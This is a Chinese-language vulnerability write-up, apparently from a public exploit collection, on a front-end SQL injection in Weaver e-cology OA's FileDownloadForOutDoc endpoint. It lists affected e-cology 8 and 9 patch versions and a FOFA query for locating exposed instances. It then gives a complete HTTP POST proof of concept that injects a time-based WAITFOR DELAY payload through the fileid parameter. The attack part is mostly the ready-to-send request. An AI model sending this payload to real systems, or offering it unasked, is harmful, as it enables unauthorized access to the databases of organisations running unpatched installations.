# 泛微OA e-cology FileDownloadForOutDoc前台SQL注入漏洞.md

## 漏洞描述

泛微e-cology未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞

## 漏洞影响

```
部分e-cology 8且补丁版本<10.58.0
部分e-cology 9且补丁版本<10.58.0
```

## FOFA

```
app="泛微-协同办公OA"
```

## 漏洞复现
主页
<img width="1304" alt="image" src="images/c1a26215-1b62-419c-9db4-feb67d554edc.png">


POC

```plain
POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

fileid=3+WAITFOR+DELAY+'0:0:8'&isFromOutImg=1
```

<img width="1266" alt="image" src="images/5476bce7-1c60-4b6c-886a-92c014f43a50.png">
